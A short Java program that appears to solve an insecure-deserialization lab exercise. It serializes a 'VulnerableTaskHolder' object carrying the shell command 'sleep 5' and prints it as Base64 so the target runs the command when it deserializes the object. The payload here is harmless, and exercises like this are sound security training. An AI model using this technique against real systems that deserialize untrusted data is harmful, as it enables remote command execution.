import org.dummy.insecure.framework.VulnerableTaskHolder;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.util.Base64;

public class Main{
    public static void main(String[] args) throws IOException {
        VulnerableTaskHolder vulnerableTaskHolder=new VulnerableTaskHolder("sleep","sleep 5");
        ByteArrayOutputStream byteArrayOutputStream=new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream=new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeUnshared(vulnerableTaskHolder);
        String out=Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());
        System.out.println(out);
    }
}
